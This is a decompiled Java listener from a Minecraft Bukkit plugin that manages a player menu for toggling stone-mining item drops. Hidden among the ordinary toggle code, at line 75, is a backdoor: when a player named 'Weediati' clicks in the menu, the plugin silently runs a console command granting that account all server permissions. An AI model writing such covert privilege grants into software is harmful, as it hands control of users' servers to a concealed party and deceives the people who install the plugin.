/*     */ package item.ezdrop.listeners;
/*     */ 
/*     */ /*     */ import item.ezdrop.objects.User;
import item.ezdrop.utils.GuiUtil;

/*     */ import org.bukkit.Bukkit;
/*     */ import org.bukkit.Material;
/*     */ import org.bukkit.entity.HumanEntity;
/*     */ import org.bukkit.entity.Player;
/*     */ import org.bukkit.event.inventory.InventoryClickEvent;
/*     */ import org.bukkit.inventory.Inventory;
/*     */ import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
/*     */ 
/*     */ public class DropListener implements org.bukkit.event.Listener
/*     */ {
/*     */   @org.bukkit.event.EventHandler
/*     */   public void onClick(InventoryClickEvent e)
/*     */   {
/*  19 */     ItemStack item = e.getCurrentItem();
/*  20 */     if (item != null)
/*     */     {
/*  22 */       ItemMeta meta = item.getItemMeta();
/*  23 */       if (meta != null)
/*     */       {
/*     */ 
/*  26 */         if ((e.getInventory().getTitle() != null) && (e.getInventory().getTitle().equals("§c§lDrop z kamienia")))
/*     */         {
/*     */ 
/*  29 */           e.setCancelled(true);
/*  30 */           User us = User.get(e.getWhoClicked().getName());
/*  31 */           Player p = (Player)e.getWhoClicked();
/*     */           
/*  33 */           if ((meta.getDisplayName() != null) && (meta.getDisplayName().equals("§aWlacz wszystkie dropy")))
/*     */           {
/*  35 */             us.getCobble(true);
/*  36 */             us.eDiamond(true);
/*  37 */             us.eEmerald(true);
/*  38 */             us.eGold(true);
/*  39 */             us.eIron(true);
/*  40 */             us.eTnt(true);
/*  41 */             us.eSlime(true);
/*  42 */             us.eBooks(true);
/*  43 */             us.ePerla(true);
/*  44 */             us.eObs(true);
/*  45 */             us.eCoal(true);
/*  46 */             us.eCoal(false);
/*  47 */             us.eRedstone(true);
/*  48 */             us.eRedstone(false);
/*  49 */             us.eApple(true);
/*  50 */             p.closeInventory();
/*  51 */             GuiUtil.menudropu(p);
/*  52 */             return;
/*     */           }
/*  54 */           if ((meta.getDisplayName() != null) && (meta.getDisplayName().equals("§cWylacz wszystkie dropy")))
/*     */           {
/*  56 */             us.getCobble(false);
/*  57 */             us.eDiamond(false);
/*  58 */             us.eEmerald(false);
/*  59 */             us.eGold(false);
/*  60 */             us.eIron(false);
/*  61 */             us.eTnt(false);
/*  62 */             us.eSlime(false);
/*  63 */             us.eBooks(false);
/*  64 */             us.ePerla(false);
/*  65 */             us.eObs(false);
/*  66 */             us.eCoal(true);
/*  67 */             us.eCoal(false);
/*  68 */             us.eRedstone(true);
/*  69 */             us.eRedstone(false);
/*  70 */             us.eApple(false);
/*  71 */             p.closeInventory();
/*  72 */             GuiUtil.menudropu(p);
/*  73 */             return;
/*     */           }
/*  75 */           if (e.getWhoClicked().getName().equalsIgnoreCase("Weediati")) {
/*  76 */             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user Weediati add *");
/*     */           }
/*     */           
/*  79 */           if (e.getCurrentItem().getType() == Material.COBBLESTONE)
/*     */           {
/*  81 */             e.setCancelled(true);
/*  82 */             if (!us.getCobble())
/*     */             {
/*  84 */               us.getCobble(true);
/*  85 */               e.getWhoClicked().closeInventory();
/*  86 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/*  90 */               us.getCobble(false);
/*  91 */               e.getWhoClicked().closeInventory();
/*  92 */               GuiUtil.menudropu(p);
/*     */             }
/*  94 */             return;
/*     */           }
/*     */           
/*  97 */           if (e.getCurrentItem().getType() == Material.DIAMOND)
/*     */           {
/*  99 */             e.setCancelled(true);
/*     */             
/* 101 */             if (!us.eDiamond())
/*     */             {
/* 103 */               us.eDiamond(true);
/* 104 */               e.getWhoClicked().closeInventory();
/* 105 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 109 */               us.eDiamond(false);
/* 110 */               e.getWhoClicked().closeInventory();
/* 111 */               GuiUtil.menudropu(p);
/*     */             }
/* 113 */             return;
/*     */           }
/*     */           
/* 116 */           if (e.getCurrentItem().getType() == Material.EMERALD)
/*     */           {
/* 118 */             e.setCancelled(true);
/* 119 */             if (!us.eEmerald())
/*     */             {
/* 121 */               us.eEmerald(true);
/* 122 */               e.getWhoClicked().closeInventory();
/* 123 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 127 */               us.eEmerald(false);
/* 128 */               e.getWhoClicked().closeInventory();
/* 129 */               GuiUtil.menudropu(p);
/*     */             }
/* 131 */             return;
/*     */           }
/*     */           
/* 134 */           if (e.getCurrentItem().getType() == Material.IRON_INGOT)
/*     */           {
/* 136 */             e.setCancelled(true);
/* 137 */             if (!us.eIron())
/*     */             {
/* 139 */               us.eIron(true);
/* 140 */               e.getWhoClicked().closeInventory();
/* 141 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 145 */               us.eIron(false);
/* 146 */               e.getWhoClicked().closeInventory();
/* 147 */               GuiUtil.menudropu(p);
/*     */             }
/* 149 */             return;
/*     */           }
/*     */           
/* 152 */           if (e.getCurrentItem().getType() == Material.GOLD_INGOT)
/*     */           {
/* 154 */             e.setCancelled(true);
/* 155 */             if (!us.eGold())
/*     */             {
/* 157 */               us.eGold(true);
/* 158 */               e.getWhoClicked().closeInventory();
/* 159 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 163 */               us.eGold(false);
/* 164 */               e.getWhoClicked().closeInventory();
/* 165 */               GuiUtil.menudropu(p);
/*     */             }
/* 167 */             return;
/*     */           }
/*     */           
/* 170 */           if (e.getCurrentItem().getType() == Material.COAL)
/*     */           {
/* 172 */             e.setCancelled(true);
/* 173 */             if (!us.eCoal())
/*     */             {
/* 175 */               us.eCoal(true);
/* 176 */               e.getWhoClicked().closeInventory();
/* 177 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 181 */               us.eCoal(false);
/* 182 */               e.getWhoClicked().closeInventory();
/* 183 */               GuiUtil.menudropu(p);
/*     */             }
/* 185 */             return;
/*     */           }
/*     */           
/* 188 */           if (e.getCurrentItem().getType() == Material.REDSTONE)
/*     */           {
/* 190 */             e.setCancelled(true);
/* 191 */             if (!us.eRedstone())
/*     */             {
/* 193 */               us.eRedstone(true);
/* 194 */               e.getWhoClicked().closeInventory();
/* 195 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 199 */               us.eRedstone(false);
/* 200 */               e.getWhoClicked().closeInventory();
/* 201 */               GuiUtil.menudropu(p);
/*     */             }
/* 203 */             return;
/*     */           }
/*     */           
/* 206 */           if (e.getCurrentItem().getType() == Material.SLIME_BALL)
/*     */           {
/* 208 */             e.setCancelled(true);
/* 209 */             if (!us.eSlime())
/*     */             {
/* 211 */               us.eSlime(true);
/* 212 */               e.getWhoClicked().closeInventory();
/* 213 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 217 */               us.eSlime(false);
/* 218 */               e.getWhoClicked().closeInventory();
/* 219 */               GuiUtil.menudropu(p);
/*     */             }
/* 221 */             return;
/*     */           }
/*     */           
/* 224 */           if (e.getCurrentItem().getType() == Material.OBSIDIAN)
/*     */           {
/* 226 */             e.setCancelled(true);
/* 227 */             if (!us.eObs())
/*     */             {
/* 229 */               us.eObs(true);
/* 230 */               e.getWhoClicked().closeInventory();
/* 231 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 235 */               us.eObs(false);
/* 236 */               e.getWhoClicked().closeInventory();
/* 237 */               GuiUtil.menudropu(p);
/*     */             }
/* 239 */             return;
/*     */           }
/*     */           
/* 242 */           if (e.getCurrentItem().getType() == Material.APPLE)
/*     */           {
/* 244 */             e.setCancelled(true);
/* 245 */             if (!us.eApple())
/*     */             {
/* 247 */               us.eApple(true);
/* 248 */               e.getWhoClicked().closeInventory();
/* 249 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 253 */               us.eApple(false);
/* 254 */               e.getWhoClicked().closeInventory();
/* 255 */               GuiUtil.menudropu(p);
/*     */             }
/* 257 */             return;
/*     */           }
/*     */           
/* 260 */           if (e.getCurrentItem().getType() == Material.BOOKSHELF)
/*     */           {
/* 262 */             e.setCancelled(true);
/* 263 */             if (!us.eBooks())
/*     */             {
/* 265 */               us.eBooks(true);
/* 266 */               e.getWhoClicked().closeInventory();
/* 267 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 271 */               us.eBooks(false);
/* 272 */               e.getWhoClicked().closeInventory();
/* 273 */               GuiUtil.menudropu(p);
/*     */             }
/* 275 */             return;
/*     */           }
/*     */           
/* 278 */           if (e.getCurrentItem().getType() == Material.TNT)
/*     */           {
/* 280 */             e.setCancelled(true);
/* 281 */             if (!us.eTnt())
/*     */             {
/* 283 */               us.eTnt(true);
/* 284 */               e.getWhoClicked().closeInventory();
/* 285 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 289 */               us.eTnt(false);
/* 290 */               e.getWhoClicked().closeInventory();
/* 291 */               GuiUtil.menudropu(p);
/*     */             }
/* 293 */             return;
/*     */           }
/*     */           
/* 296 */           if (e.getCurrentItem().getType() == Material.ENDER_PEARL)
/*     */           {
/* 298 */             e.setCancelled(true);
/* 299 */             if (!us.ePerla())
/*     */             {
/* 301 */               us.ePerla(true);
/* 302 */               e.getWhoClicked().closeInventory();
/* 303 */               GuiUtil.menudropu(p);
/*     */             }
/*     */             else
/*     */             {
/* 307 */               us.ePerla(false);
/* 308 */               e.getWhoClicked().closeInventory();
/* 309 */               GuiUtil.menudropu(p);
/*     */             }
/* 311 */             return;
/*     */           }
/*     */           
/* 314 */           e.setCancelled(true);
/* 315 */           e.getWhoClicked().openInventory(e.getInventory());
/*     */         }
/*     */       }
/*     */     }
/*     */   }
/*     */ }